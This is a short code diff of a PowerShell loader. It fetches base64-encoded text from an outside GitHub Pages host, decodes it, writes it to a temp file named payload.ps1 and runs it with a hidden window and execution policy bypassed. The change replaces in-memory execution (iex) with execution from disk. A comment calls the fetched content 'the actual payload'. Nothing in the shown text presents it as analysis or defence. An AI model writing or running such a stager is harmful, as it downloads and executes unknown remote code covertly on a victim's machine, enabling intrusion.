@@ -24,4 +24,9 @@ $u = 'https://infinityteq.github.io/shadow.b64'
 $r = iwr $u -UseBasicParsing
 $t = if ($r.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($r.Content) } else { $r.Content }
 $t = $t -replace '\s',''
-iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t)))
+$src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t))
+
+# Write the actual payload to disk, then run it as a file
+$p = "$env:TEMP\payload.ps1"
+[IO.File]::WriteAllText($p, $src)
+& powershell.exe -w hidden -nop -ep bypass -File $p
